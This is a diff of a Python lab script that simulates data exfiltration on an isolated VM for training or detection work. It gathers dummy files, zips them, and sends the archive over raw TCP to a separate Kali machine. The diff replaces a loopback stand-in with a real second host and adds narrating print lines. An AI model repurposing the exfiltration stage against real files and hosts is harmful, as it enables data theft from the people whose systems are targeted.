@@ -8,12 +8,7 @@ real sensitive data. Run only on an isolated lab VM.
 Stages:
   1. Files gathered into a staging folder
   2. Folder compressed into an archive
-  3. Archive sent to an "external" address (loopback stand-in — see note)
-
-NOTE: Stage 3 currently sends to a local HTTP listener on localhost as a
-stand-in for a genuine external destination, since no second lab VM is
-set up yet. Same simplification as Scenario 2's lateral movement stage —
-flag to Rasy, upgrade once the two-machine lab (OPPM 3.1) is available.
+  3. Archive sent to a real second machine (Kali VM)
 """
 
 import subprocess
@@ -43,6 +38,7 @@ def log(message: str):
 def stage1_gather_files():
     """Gathers a few benign dummy files into a staging folder -- stand-in
     for an attacker collecting data of interest before exfiltration."""
+    print("\n--- Step 1: Gathering files, like an attacker collecting documents of interest ---")
     log("STAGE1_GATHER_FILES_START")
 
     os.makedirs(STAGING_DIR, exist_ok=True)
@@ -51,25 +47,28 @@ def stage1_gather_files():
         with open(fpath, "w") as f:
             f.write(f"benign placeholder content {i}\n")
 
+    print("    -> Collected 3 sample files into a staging folder.")
     log("STAGE1_GATHER_FILES_COMPLETE")
 
 
 def stage2_archive():
     """Compresses the staging folder into a zip archive -- T1560."""
+    print("\n--- Step 2: Compressing the files into a single archive, to make them easier to move ---")
     log("STAGE2_ARCHIVE_START")
 
     try:
         archive_base = ARCHIVE_PATH.replace(".zip", "")
         shutil.make_archive(archive_base, "zip", STAGING_DIR)
+        print("    -> Archive created.")
         log("STAGE2_ARCHIVE_CREATED")
     except Exception as e:
         log(f"STAGE2_ARCHIVE_ERROR: {e}")
 
 
-
 def stage3_exfiltrate():
     """Sends the archive to a real second machine (Kali VM) via raw TCP --
     genuine cross-host connection, no longer a loopback stand-in."""
+    print("\n--- Step 3: Sending the archive out to another computer, simulating data theft ---")
     log("STAGE3_EXFILTRATION_START")
     try:
         with open(ARCHIVE_PATH, "rb") as f:
@@ -81,6 +80,7 @@ def stage3_exfiltrate():
         client.sendall(data)
         client.close()
 
+        print(f"    -> The archive was successfully sent out to {EXFIL_HOST} — this is what data theft looks like on the network.")
         log(f"STAGE3_EXFILTRATION_COMPLETE: sent to {EXFIL_HOST}:{EXFIL_PORT}")
     except Exception as e:
         log(f"STAGE3_ERROR: {e}")
@@ -101,12 +101,21 @@ def cleanup():
 
 
 def main():
+    print("=" * 60)
+    print("Starting Scenario 3: Data Exfiltration")
+    print("This simulates a hacker stealing files and sending them out")
+    print("of the network to somewhere they control.")
+    print("=" * 60)
+
     log("SCENARIO3_RUN_START")
     stage1_gather_files()
     stage2_archive()
     stage3_exfiltrate()
     log("SCENARIO3_RUN_COMPLETE")
+
+    print("\n--- Cleaning up: removing the test traces we just created ---")
     cleanup()
+    print("\nDone. Scenario 3 complete.")
 
 
 if __name__ == "__main__":
